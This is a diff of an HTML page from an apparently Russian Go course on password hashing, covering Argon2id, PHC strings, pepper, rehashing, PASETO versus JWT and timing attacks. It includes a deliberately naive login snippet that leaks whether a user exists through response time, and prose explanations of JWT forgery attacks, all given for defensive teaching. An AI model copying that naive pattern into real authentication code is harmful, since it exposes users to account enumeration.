 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Уязвимость к Side-Channel в ранних версиях:</strong> Поскольку адресация в ROMix зависит от данных пароля, scrypt теоретически подвержен атакам через замеры задержек кэша процессора (cache-timing attacks). Именно поэтому в конкурсе PHC победил Argon2id, где первые проходы являются полностью независимыми от данных.</div></div>
   </div>
@@ -7462,7 +7434,7 @@ func main() {
 </ul>
 <p style="margin-bottom: 6px;">Применяется в средах с жесткими лимитами по памяти (например, небольшие контейнеры или мобильные клиенты).</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Принцип подбора параметров:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Принцип подбора параметров:</h5>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;"><strong>Память ($m$):</strong> Увеличивайте до максимального значения, которое бэкенд может выделить при пиковой нагрузке (с учетом пула соединений), не рискуя вызвать OOM Killer.</li>
 <li style="margin-bottom: 4px;"><strong>Время ($t$):</strong> Подбирается так, чтобы суммарное время вычисления одного хэша на продакшн-сервере укладывалось в <strong>200–500 мс</strong>.</li>
@@ -7603,7 +7575,7 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Игнорирование ограничений vCPU в контейнерах (CFS Quota):</strong> В Kubernetes контейнеру может быть выделен лимит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cpu: "1"</code>, в то время как <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">runtime.NumCPU()</code> вернет 64 (число ядер хост-машины). Установка <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">parallelism = 64</code> в 1-ядерном контейнере вызовет жесточайший throttling планировщика Linux CFS и замедлит хэширование в 10–20 раз! Используйте библиотеки типа <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">uber-go/automaxprocs</code> или читайте cgroups quota.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Игнорирование ограничений vCPU в контейнерах (CFS Quota):</strong> В Kubernetes контейнеру может быть выделен лимит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cpu: &quot;1&quot;</code>, в то время как <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">runtime.NumCPU()</code> вернет 64 (число ядер хост-машины). Установка <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">parallelism = 64</code> в 1-ядерном контейнере вызовет жесточайший throttling планировщика Linux CFS и замедлит хэширование в 10–20 раз! Используйте библиотеки типа <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">uber-go/automaxprocs</code> или читайте cgroups quota.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Слишком большая длина результирующего ключа ($keyLen$):</strong> Некоторые разработчики указывают $keyLen = 64$ или $128$. Это избыточно: 32 байта (256 бит) обеспечивают максимальный криптографический уровень безопасности.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Недостаточная длина соли:</strong> Соль менее 16 байт снижает пространство состояний и повышает риск коллизий в масштабах базы данных с миллионами пользователей.</div></div>
   </div>
@@ -7792,18 +7764,16 @@ func main() {
     <div><p style="margin-bottom: 6px;">При сохранении учетных данных в реляционных и NoSQL базах данных (PostgreSQL, MySQL, MongoDB) категорически не рекомендуется сохранять параметры алгоритма, соль и хэш в отдельных колонках таблицы.</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Официальным отраслевым стандартом является <strong>строковый формат PHC (Password Hashing Competition string format)</strong>:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`text</p>
-<p style="margin-bottom: 6px;">$argon2id$v=19$m=65536,t=3,p=4$<b64salt>$<b64hash></p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-text"><code class="language-text">$argon2id$v=19$m=65536,t=3,p=4$&lt;b64salt&gt;$&lt;b64hash&gt;</code></pre></div>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Строка состоит из полей, разделенных знаком доллара <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$</code>:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">argon2id</code> — идентификатор алгоритма.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">v=19</code> — версия алгоритма (в шестнадцатеричном виде $0x13 = 19$, актуальная версия Argon2 v1.3).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">m=65536,t=3,p=4</code> — параметры: память в КиБ ($m$), количество итераций ($t$) и параллелизм ($p$).</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"><b64salt></code> — криптографическая соль в кодировке <strong>Base64 Raw (без знаков '=' заполнения)</strong>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"><b64hash></code> — вычисленный дайджест в кодировке Base64 Raw.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&lt;b64salt&gt;</code> — криптографическая соль в кодировке <strong>Base64 Raw (без знаков &#x27;=&#x27; заполнения)</strong>.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&lt;b64hash&gt;</code> — вычисленный дайджест в кодировке Base64 Raw.</div>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Архитектурные преимущества PHC формата:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Архитектурные преимущества PHC формата:</h5>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;"><strong>Самодостаточность:</strong> Строка содержит все параметры, необходимые для проверки пароля.</li>
 <li style="margin-bottom: 4px;"><strong>Бесшовная ротация параметров:</strong> Вы можете в любой момент изменить настройки (например, увеличить память с 64 МБ до 128 МБ) для новых паролей, а старые пароли продолжат успешно верифицироваться по своим собственным параметрам из строки.</li>
@@ -7996,7 +7966,7 @@ func main() {
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
     <div><p style="margin-bottom: 6px;">Почему графические ускорители (GPU) типа NVIDIA RTX 4090 или серверные H100 так эффективны при взломе MD5, SHA-256 и даже bcrypt?</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Архитектура GPU vs CPU:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Архитектура GPU vs CPU:</h5>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;"><strong>Современный серверный CPU:</strong> Имеет от 16 до 64 мощных ядер с огромными быстрыми кэшами (L1/L2/L3 до сотен мегабайт) и сложнейшими блоками предсказания переходов.</li>
 <li style="margin-bottom: 4px;"><strong>GPU (CUDA/OpenCL):</strong> Содержит от 10 000 до 16 000 маленьких вычислительных потоковых процессоров (CUDA cores). Они способны параллельно выполнять миллионы простых операций в секунду, но обладают минимальным локальным кэшем на ядро (буквально десятки килобайт).</li>
@@ -8187,7 +8157,7 @@ func main() {
 <li style="margin-bottom: 4px;"><strong>Перец (Pepper):</strong> Строго секретен, один на все приложение (или набор версионированных секретов), хранится <strong>вне базы данных</strong> — в переменных окружения, HashiCorp Vault, AWS Secrets Manager или аппаратном модуле безопасности (HSM).</li>
 </ul>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Как правильно комбинировать пароль и pepper?</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Как правильно комбинировать пароль и pepper?</h5>
 <p style="margin-bottom: 6px;">Наивная конкатенация строк <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">password + pepper</code> уязвима к атакам удлинения и коллизиям.</p>
 <p style="margin-bottom: 6px;">Рекомендованный криптографический стандарт: <strong>HMAC-SHA256(pepper, password)</strong>.</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Вычисляется HMAC от пароля с использованием перца в качестве секретного ключа:</div>
@@ -8340,15 +8310,15 @@ func main() {
   </div>
   <div class="callout callout-task">
     <div class="callout-title">📌 Условие задачи</div>
-    <div><p style="margin-bottom: 6px;">Реализуйте transparent rehashing: при успешном логине, если хэш в слабом формате (MD5/sha256/bcrypt cost<10), пересоздайте его в Argon2id.</p></div>
+    <div><p style="margin-bottom: 6px;">Реализуйте transparent rehashing: при успешном логине, если хэш в слабом формате (MD5/sha256/bcrypt cost&lt;10), пересоздайте его в Argon2id.</p></div>
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
-    <div><p style="margin-bottom: 6px;">В процессе эволюции корпоративных бэкенд-систем неизбежно возникает необходимость обновления криптографических стандартов: переход от старых быстрых хэшей (MD5, SHA-1, SHA-256) или слабых настроек (bcrypt cost < 10) к современному стойкому стандарту <strong>Argon2id</strong>.</p>
+    <div><p style="margin-bottom: 6px;">В процессе эволюции корпоративных бэкенд-систем неизбежно возникает необходимость обновления криптографических стандартов: переход от старых быстрых хэшей (MD5, SHA-1, SHA-256) или слабых настроек (bcrypt cost &lt; 10) к современному стойкому стандарту <strong>Argon2id</strong>.</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Массово перехешировать пароли в базе данных невозможно, поскольку хэш-функции необратимы, а открытые пароли пользователей бэкенд не знает и не хранит. Принудительный сброс паролей (Password Reset) вызывает отток клиентов и перегрузку службы поддержки.</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Архитектурный паттерн: Transparent Re-hashing (Прозрачная миграция)</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Архитектурный паттерн: Transparent Re-hashing (Прозрачная миграция)</h5>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Идентификация формата хэша:</strong> При запросе логина система определяет алгоритм сохраненного хэша по префиксу или сигнатуре (например, префикс <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$argon2id$</code> — современный, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$2a$</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$2b$</code> — bcrypt, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$sha256$</code> — SHA-256 с солью, 32-символьный hex — старый MD5).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Проверка подлинности:</strong> Пароль верифицируется с использованием старого (legacy) алгоритма. Если пароль неверен — возвращается ошибка аутентификации.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Бесшовное обновление (Re-hash):</strong> Если пароль верен, бэкенд прямо в памяти берет открытый пароль из текущего запроса, вычисляет новый стойкий хэш <strong>Argon2id</strong> и сохраняет его в БД вместо устаревшего.</div>
@@ -8561,18 +8531,18 @@ func main() {
   </div>
   <div class="callout callout-task">
     <div class="callout-title">📌 Условие задачи</div>
-    <div><p style="margin-bottom: 6px;">Стандарт JWT содержит ряд критических уязвимостей в дизайне (например, поддержка алгоритма "none", уязвимости парсинга заголовков). Напишите генератор сессионных токенов авторизации на базе современного стандарта PASETO (Platform-Agnostic Security Tokens) версии 4 (локальные токены с симметричным шифрованием v4.local) [545] с использованием библиотеки github.com/o1egl/paseto или аналогичной [545]. Напишите комментарий, почему PASETO безопаснее JWT по умолчанию [545].</p></div>
+    <div><p style="margin-bottom: 6px;">Стандарт JWT содержит ряд критических уязвимостей в дизайне (например, поддержка алгоритма &quot;none&quot;, уязвимости парсинга заголовков). Напишите генератор сессионных токенов авторизации на базе современного стандарта PASETO (Platform-Agnostic Security Tokens) версии 4 (локальные токены с симметричным шифрованием v4.local) [545] с использованием библиотеки github.com/o1egl/paseto или аналогичной [545]. Напишите комментарий, почему PASETO безопаснее JWT по умолчанию [545].</p></div>
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
     <div><p style="margin-bottom: 6px;">Формат <strong>JSON Web Tokens (JWT / RFC 7519)</strong> на протяжении десятилетия доминировал в веб-разработке, однако накопил фундаментальные архитектурные изъяны (Design Flaws):</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Главные уязвимости JWT:</p>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Атака <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"alg": "none"</code>:</strong> Заголовок JWT передается клиентом в открытом виде. Злоумышленник может изменить алгоритм на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">none</code> и стереть подпись. Уязвимые библиотеки доверяли заголовку и считали токен валидным!</div>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Главные уязвимости JWT:</h5>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Атака <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;alg&quot;: &quot;none&quot;</code>:</strong> Заголовок JWT передается клиентом в открытом виде. Злоумышленник может изменить алгоритм на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">none</code> и стереть подпись. Уязвимые библиотеки доверяли заголовку и считали токен валидным!</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Algorithm Confusion (RS256 vs HS256):</strong> Злоумышленник меняет в заголовке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">RS256</code> на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">HS256</code>. Сервер берет публичный ключ RSA и проверяет токен как HMAC-SHA256, используя публичный ключ (который известен всем!) в качестве секрета HMAC.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Открытость полезной нагрузки (Payload Leaks):</strong> По умолчанию JWT в формате JWS только подписан, но не зашифрован. Любые данные (User ID, роли, email) видны клиенту через обычный Base64.</div>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Почему PASETO (Platform-Agnostic Security Tokens) безопаснее?</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Почему PASETO (Platform-Agnostic Security Tokens) безопаснее?</h5>
 <p style="margin-bottom: 6px;"><strong>PASETO</strong> исключает выбор алгоритмов разработчиком («Cipher Agility Trap»). Формат токена строго версионирован:</p>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;"><strong><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">v4.local</code>:</strong> Симметричное сквозное шифрование. Полезная нагрузка полностью зашифрована шифром <strong>XChaCha20-Poly1305</strong> с аутентификацией открытого текста. Клиент не видит содержимое токена, а подделка математически невозможна.</li>
@@ -8741,7 +8711,7 @@ func main() {
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования в Яндекс/Касперский:</strong> «Почему архитекторы безопасности рекомендуют переходить с JWT на PASETO в современных распределенных микросервисах?»</p>
-<p style="margin-bottom: 6px;"><strong>Ответ:</strong> JWT содержит критические архитектурные изъяны спецификации JOSE: он позволяет клиенту диктовать серверу используемый алгоритм шифрования/подписи в открытом заголовке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">alg</code>, что привело к историческим уязвимостям <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"none"</code>, Algorithm Confusion (HMAC vs RSA) и некорректным реализациям парсеров. PASETO спроектирован по принципу «No Cipher Agility»: в нем нет выбора алгоритма. Версия жестко определяет безопасные современные примитивы (XChaCha20-Poly1305 / Ed25519). Кроме того, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">v4.local</code> шифрует payload, предотвращая утечку внутренних данных архитектуры (ID, email, roles) третьим лицам.</p></div>
+<p style="margin-bottom: 6px;"><strong>Ответ:</strong> JWT содержит критические архитектурные изъяны спецификации JOSE: он позволяет клиенту диктовать серверу используемый алгоритм шифрования/подписи в открытом заголовке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">alg</code>, что привело к историческим уязвимостям <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;none&quot;</code>, Algorithm Confusion (HMAC vs RSA) и некорректным реализациям парсеров. PASETO спроектирован по принципу «No Cipher Agility»: в нем нет выбора алгоритма. Версия жестко определяет безопасные современные примитивы (XChaCha20-Poly1305 / Ed25519). Кроме того, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">v4.local</code> шифрует payload, предотвращая утечку внутренних данных архитектуры (ID, email, roles) третьим лицам.</p></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-50">
@@ -8763,7 +8733,7 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Минимальная длина от 12–16 символов.</strong></div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Проверка по базам скомпрометированных паролей</strong> (leaked / breached passwords).</div>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Математическая модель k-Anonymity (Трой Хант, HaveIBeenPwned API):</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Математическая модель k-Anonymity (Трой Хант, HaveIBeenPwned API):</h5>
 <p style="margin-bottom: 6px;">Чтобы проверить, был ли пароль пользователя скомпрометирован в известных утечках (более 14 миллиардов паролей), <strong>ни в коем случае нельзя отправлять сам пароль на внешний сервер!</strong></p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Для этого применяется протокол <strong>k-Anonymity</strong>:</p>
@@ -8951,18 +8921,16 @@ func main() {
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
     <div><p style="margin-bottom: 6px;">Одна из самых распространенных уязвимостей в API аутентификации — <strong>утечка факта существования пользователя через замеры времени (Timing Attack / User Enumeration)</strong>:</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Механика уязвимости в наивном коде:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">user, err := db.FindUser(email)</p>
-<p style="margin-bottom: 6px;">if err != nil {</p>
-<p style="margin-bottom: 6px;">// Пользователя нет: возвращаем 401 Unauthorized МГНОВЕННО (за 0.5 мс)</p>
-<p style="margin-bottom: 6px;">return ErrUnauthorized</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;">// Пользователь существует: вычисляем тяжелый bcrypt (занимает ~150 мс)</p>
-<p style="margin-bottom: 6px;">if err := bcrypt.CompareHashAndPassword(user.Hash, password); err != nil {</p>
-<p style="margin-bottom: 6px;">return ErrUnauthorized</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Механика уязвимости в наивном коде:</h5>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">user, err := db.FindUser(email)
+if err != nil {
+    // Пользователя нет: возвращаем 401 Unauthorized МГНОВЕННО (за 0.5 мс)
+    return ErrUnauthorized
+}
+// Пользователь существует: вычисляем тяжелый bcrypt (занимает ~150 мс)
+if err := bcrypt.CompareHashAndPassword(user.Hash, password); err != nil {
+    return ErrUnauthorized
+}</code></pre></div>
 <p style="margin-bottom: 6px;">Атакующий отправляет 1000 запросов со списком email-адресов сотрудников компании:</p>
 <ul style="margin: 8px 0 8px 20px;">
 <li style="margin-bottom: 4px;">Если ответ приходит за <strong>0.5 мс</strong>, пользователя с таким email <strong>нет в системе</strong>.</li>
@@ -8970,7 +8938,7 @@ func main() {
 </ul>
 <p style="margin-bottom: 6px;">Таким образом, злоумышленник с легкостью составляет список валидных корпоративных аккаунтов для целенаправленного фишинга и подбора (Password Spraying).</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Архитектурное решение: Dummy Hash Evaluation</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Архитектурное решение: Dummy Hash Evaluation</h5>
 <p style="margin-bottom: 6px;">Если пользователь не найден в базе данных, сервер <strong>не должен немедленно возвращать ошибку</strong>. Вместо этого сервер обязан выполнить фиктивное вычисление <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.CompareHashAndPassword</code> с заранее сгенерированным фейковым хэшем той же сложности (dummy hash). Время ответа для существующего и несуществующего пользователя становится <strong>строго одинаковым</strong>.</p></div>
   </div>
   <div style="margin: 18px 0 10px;">
@@ -9097,18 +9065,18 @@ func main() {
   </div>
   <div class="callout callout-hood">
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
-    <div><p style="margin-bottom: 6px;">В микросекундном диапазоне разница между 40 микросекундами и 70 миллисекундами составляет более трех порядков величины ($>1500\times$). Даже при наличии сетевого джиттера в Интернете статистический анализ медианного времени по 5–10 запросам позволяет атакующему с вероятностью 99.9% определить наличие пользователя в базе данных.</p>
+    <div><p style="margin-bottom: 6px;">В микросекундном диапазоне разница между 40 микросекундами и 70 миллисекундами составляет более трех порядков величины ($&gt;1500\times$). Даже при наличии сетевого джиттера в Интернете статистический анализ медианного времени по 5–10 запросам позволяет атакующему с вероятностью 99.9% определить наличие пользователя в базе данных.</p>
 <p style="margin-bottom: 6px;">Вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.CompareHashAndPassword</code> с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">dummyHash</code> принудительно тратит ровно $2^{\text{cost}}$ итераций шифра Blowfish, нивелируя дельту до статистической погрешности.</p></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Генерация нового Dummy-хэша на лету:</strong> Если вызывать <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.GenerateFromPassword</code> внутри каждого запроса отсутствующего юзера, время удвоится (генерация + сравнение займут 300 мс вместо 150 мс), что снова выдаст сервер! Dummy-хэш обязан генерироваться один раз при инициализации сервиса.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Утечка через текст ошибки:</strong> Если сервер возвращает "Пользователь не найден" вместо общего "Неверный логин или пароль", выравнивание тайминга бесполезно. Сообщение об ошибке обязано быть единым.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Утечка через текст ошибки:</strong> Если сервер возвращает &quot;Пользователь не найден&quot; вместо общего &quot;Неверный логин или пароль&quot;, выравнивание тайминга бесполезно. Сообщение об ошибке обязано быть единым.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> <strong>Разница в статусах HTTP:</strong> Не возвращайте <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">404 Not Found</code> для отсутствующего юзера и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">401 Unauthorized</code> для неверного пароля. Всегда возвращайте единый HTTP-код <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">401 Unauthorized</code>.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
-    <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования в Касперский/Яндекс:</strong> «Как злоумышленник может определить список зарегистрированных пользователей сервиса, если форма логина возвращает одинаковую ошибку "Invalid credentials"? Как предотвратить эту атаку в Go?»</p>
+    <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования в Касперский/Яндекс:</strong> «Как злоумышленник может определить список зарегистрированных пользователей сервиса, если форма логина возвращает одинаковую ошибку &quot;Invalid credentials&quot;? Как предотвратить эту атаку в Go?»</p>
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> Через <strong>Side-Channel Timing Attack (атаку по времени отклика)</strong>:</p>
 <p style="margin-bottom: 6px;">Если пользователь не зарегистрирован, наивный код завершает обработку сразу после чтения из БД (за доли миллисекунды). Если пользователь есть, вызывается ресурсоемкая функция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Argon2id</code> (занимает ~100–300 мс). Злоумышленник замеряет латентность HTTP-ответов и вычисляет существующие аккаунты.</p>
 <p style="margin-bottom: 6px;">Для предотвращения применяется фиктивное вычисление: при промахе в БД запускается проверка пароля против предварительно рассчитанного эталонного <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">dummyHash</code> с тем же фактором сложности. Это делает латентность одинаковой для всех запросов.</p></div>
@@ -9127,7 +9095,7 @@ func main() {
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
     <div><p style="margin-bottom: 6px;">Для принятия осознанного инженерного решения в production-архитектуре необходимо понимать точные количественные различия между <strong>bcrypt</strong> и <strong>Argon2id</strong>.</p>
 <div style="height: 8px;"></div>
-<p style="margin-bottom: 6px;">### Сравнительный профиль ресурсов:</p>
+<h5 style="color: #38bdf8; font-size: 1rem; margin: 14px 0 6px 0; font-weight: 600;">Сравнительный профиль ресурсов:</h5>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">| Критерий | Bcrypt (Cost 10) | Bcrypt (Cost 12) | Argon2id (Low: 19MB, t=2) | Argon2id (OWASP: 64MB, t=3) |</p>
 <p style="margin-bottom: 6px;">| :--- | :--- | :--- | :--- | :--- |</p>
@@ -9137,9 +9105,9 @@ func main() {
